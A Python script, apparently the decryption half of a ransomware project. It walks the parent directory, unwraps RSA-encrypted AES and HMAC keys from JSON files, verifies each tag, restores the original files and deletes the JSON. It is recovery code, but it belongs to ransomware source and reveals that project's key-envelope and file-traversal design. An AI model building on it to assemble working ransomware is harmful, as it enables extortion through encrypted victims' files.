from base64 import b64encode, b64decode
from optparse import OptionParser
import encryption, constants, os, json, cryptools




def main():

	folder_path = '..'

	rsa_cipher = encryption.AsymmetricCipher(constants.RSA_FOLDER_PATH)

	for current_directory, sub_directories, sub_files in os.walk(folder_path):

		if 'ransomware' in current_directory.lower():
			continue

		for file in sub_files:

			if 'json' not in file:
				continue
				
			with open(os.path.join(current_directory, file), 'r') as js:
				json_dict = json.load(js)

			fileName = ''.join(file.split('.')[:-1])

			tag = b64decode(json_dict['TAG'])

			cipherkeys = b64decode(json_dict['KEY'])

			ciphertext = b64decode(json_dict['CIPHER'])

			concatenated_keys = rsa_cipher.Decrypt(cipherkeys)

			aes_key, hmac_key = (concatenated_keys[:constants.AES_KEY_LENGTH], concatenated_keys[constants.AES_KEY_LENGTH:])

			aes_iv = b64decode(json_dict['IV'])

			ext = b64decode(json_dict['EXT'])

			aes_cipher = encryption.SymmetricCipher(aes_key, aes_iv)

			if cryptools.HMAC(ciphertext, hmac_key) != tag:
				print('Ciphertext has been changed for %s ', file)

			with open(os.path.join(current_directory, fileName + '.' + ext), 'wb') as f:
				f.write(aes_cipher.Decrypt(ciphertext))

			print('\n[+] Decrypting %s\n' % os.path.join(current_directory, fileName + '.' + ext))

			os.remove(os.path.join(current_directory, file))



if __name__ == '__main__':
	main()